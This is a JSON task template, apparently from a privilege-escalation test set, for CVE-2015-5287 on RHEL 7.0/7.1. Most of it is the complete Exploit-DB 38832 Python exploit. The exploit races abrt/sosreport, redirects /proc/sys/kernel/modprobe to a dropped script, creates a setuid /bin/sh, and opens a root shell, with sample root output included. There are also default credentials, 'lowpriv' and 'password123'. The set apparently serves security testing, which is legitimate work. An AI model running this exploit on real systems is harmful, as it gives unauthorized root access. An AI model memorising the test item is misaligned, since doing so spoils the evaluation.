@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_38832",
+  "category": "A5_dbus",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: RHEL 7.0/7.1 - 'abrt/sosreport' Local Privilege Escalation (CVE-2015-5287)\n\nExploit source code (38832.py):\n```\n#!/usr/bin/python\n# CVE-2015-5287 (?)\n# abrt/sosreport RHEL 7.0/7.1 local root\n# rebel 09/2015\n\n# [user@localhost ~]$ python sosreport-rhel7.py\n# crashing pid 19143\n# waiting for dump directory\n# dump directory:  /var/tmp/abrt/ccpp-2015-11-30-19:41:13-19143\n# waiting for sosreport directory\n# sosreport:  sosreport-localhost.localdomain-20151130194114\n# waiting for tmpfiles\n# tmpfiles:  ['tmpurfpyY', 'tmpYnCfnQ']\n# moving directory\n# moving tmpfiles\n# tmpurfpyY -> tmpurfpyY.old\n# tmpYnCfnQ -> tmpYnCfnQ.old\n# waiting for sosreport to finish (can take several minutes)........................................done\n# success\n# bash-4.2# id\n# uid=0(root) gid=1000(user) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\n# bash-4.2# cat /etc/redhat-release\n# Red Hat Enterprise Linux Server release 7.1 (Maipo)\n\nimport os,sys,glob,time,sys,socket\n\npayload = \"#!/bin/sh\\ncp /bin/sh /tmp/sh\\nchmod 6755 /tmp/sh\\n\"\n\npid = os.fork()\n\nif pid == 0:\n\tos.execl(\"/usr/bin/sleep\",\"sleep\",\"100\")\n\ntime.sleep(0.5)\n\nprint \"crashing pid %d\" % pid\n\nos.kill(pid,11)\n\nprint \"waiting for dump directory\"\n\ndef waitpath(p):\n\twhile 1:\n\t\tr = glob.glob(p)\n\t\tif len(r) > 0:\n\t\t\treturn r\n\t\ttime.sleep(0.05)\n\ndumpdir = waitpath(\"/var/tmp/abrt/cc*%d\" % pid)[0]\n\nprint \"dump directory: \", dumpdir\n\nos.chdir(dumpdir)\n\nprint \"waiting for sosreport directory\"\n\nsosreport = waitpath(\"sosreport-*\")[0]\n\nprint \"sosreport: \", sosreport\n\nprint \"waiting for tmpfiles\"\ntmpfiles = waitpath(\"tmp*\")\n\nprint \"tmpfiles: \", tmpfiles\n\nprint \"moving directory\"\n\nos.rename(sosreport, sosreport + \".old\")\nos.mkdir(sosreport)\nos.chmod(sosreport,0777)\n\nos.mkdir(sosreport + \"/sos_logs\")\nos.chmod(sosreport + \"/sos_logs\",0777)\n\nos.symlink(\"/proc/sys/kernel/modprobe\",sosreport + \"/sos_logs/sos.log\")\nos.symlink(\"/proc/sys/kernel/modprobe\",sosreport + \"/sos_logs/ui.log\")\n\nprint \"moving tmpfiles\"\n\nfor x in tmpfiles:\n\tprint \"%s -> %s\" % (x,x + \".old\")\n\tos.rename(x, x + \".old\")\n\topen(x, \"w+\").write(\"/tmp/hax.sh\\n\")\n\tos.chmod(x,0666)\n\n\nos.chdir(\"/\")\n\nsys.stderr.write(\"waiting for sosreport to finish (can take several minutes)..\")\n\n\ndef trigger():\n\topen(\"/tmp/hax.sh\",\"w+\").write(payload)\n\tos.chmod(\"/tmp/hax.sh\",0755)\n\ttry: socket.socket(socket.AF_INET,socket.SOCK_STREAM,132)\n\texcept: pass\n\ttime.sleep(0.5)\n\ttry:\n\t\tos.stat(\"/tmp/sh\")\n\texcept:\n\t\tprint \"could not create suid\"\n\t\tsys.exit(-1)\n\tprint \"success\"\n\tos.execl(\"/tmp/sh\",\"sh\",\"-p\",\"-c\",'''echo /sbin/modprobe > /proc/sys/kernel/modprobe;rm -f /tmp/sh;python -c \"import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');\"''')\n\tsys.exit(-1)\n\nfor x in xrange(0,60*10):\n\tif \"/tmp/hax\" in open(\"/proc/sys/kernel/modprobe\").read():\n\t\tprint \"done\"\n\t\ttrigger()\n\ttime.sleep(1)\n\tsys.stderr.write(\".\")\n\nprint \"timed out\"\n```",
+  "cve": "CVE-2015-5287",
+  "exploitdb_id": "38832",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_38832",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
